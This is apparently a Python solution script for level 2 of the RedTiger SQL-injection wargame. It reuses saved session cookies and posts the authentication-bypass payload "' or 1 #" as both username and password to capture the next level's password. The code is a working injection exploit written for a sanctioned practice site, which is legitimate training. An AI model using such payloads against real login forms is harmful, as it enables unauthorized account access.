import pickle
import tigers as tg


def main():
    pass_r = 'The password for the next level is: '

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if 'level2login' not in cooks:
            print('use level 1')
            exit(1)
    except:
        print('use level 1')
        exit(1)

    url = "https://redtiger.labs.overthewire.org/level2.php"

    param = dict(
        username="' or 1 #",
        password="' or 1 #",
        login="Login"
    )

    cook = dict(level2login=cooks['level2login'])
    response = tg.get_request(url, param, cook, method='post')

    passw = tg.extract_pass(response).replace(pass_r, '')
    print('password:', passw)
    if ('level3login' not in cooks) or (cooks['level3login'] != passw):
        cooks['level3login'] = passw
        tg.save_cookies(cooks)


if __name__ == '__main__':
    main()
